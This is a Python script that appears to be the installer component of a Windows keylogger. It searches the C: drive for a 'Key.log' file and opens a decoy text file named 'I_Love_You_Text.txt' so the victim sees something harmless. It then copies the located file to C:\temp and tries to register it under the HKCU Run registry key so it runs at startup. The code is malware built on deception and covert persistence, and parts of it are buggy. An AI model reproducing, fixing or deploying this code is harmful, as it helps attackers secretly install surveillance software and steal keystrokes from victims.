import os
import platform
import subprocess
from shutil import copy
from winreg import *

path = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
filePath = 'C:\\temp\\Key.log'
dst = 'C:\\temp'


# Searchs the whole computer for the file
def finder(name, path):
    for root, dirs, files in os.walk( path ):
        if name in files:
            global pathF, pathB
            pathB = os.path.join( root )
            pathF = os.path.join( root, name )
            return os.path.join( root, name )


finder( 'Key.log', 'C:\\' )

src = pathF
pathDecoy = os.path.join( pathB, 'I_Love_You_Text.txt' )

# Crates the decoy file
with open( pathDecoy, 'w' ) as file:
    file.write( '<3' )
    file.close()

# Opens Decoy File when parent script clicked
if platform.system() == 'Windows':  # Windows
    os.startfile( pathDecoy )
elif platform.system() == 'Darwin':  # MacOS
    subprocess.call( ('start', pathDecoy) )
else:  # Linux
    subprocess.call( ('xdg-open', pathDecoy) )

# Copy file on startup to C:\Windows
try:
    copy( src, dst )
    print( 'Done' )
except OSError as E:
    print( 'Exception: ', str( E ) )

# Try stock access rights with 64bits program to 64bit registry
try:
    key = OpenKey( HKEY_CURRENT_USER, path, 0, access=KEY_SET_VALUE )
    SetValue( key, 'Registry', REG_SZ, filePath )  # Registry == name of the sub_key to open
    CloseKey( key )
except FileNotFoundError:
    import platform

    bits = platform.architecture()[0]

    # Detects the bitness of the computer and gives the proper additional right access
    # https://docs.microsoft.com/en-us/windows/desktop/WinProg64/accessing-an-alternate-registry-view
    if bits == '32bits':
        bits_access_right = KEY_WOW64_64KEY
    elif bits == '64bits':
        bits_access_right = KEY_WOW64_32KEY

    try:
        key = OpenKey( HKEY_CURRENT_USER, path, 0, access=KEY_SET_VALUE | bits_access_right )
        SetValue( key, 'registry', REG_SZ, filePath )
        CloseKey( key )
    except Exception as e:
        print( 'Excepetion: %s' % str( e ) )
        
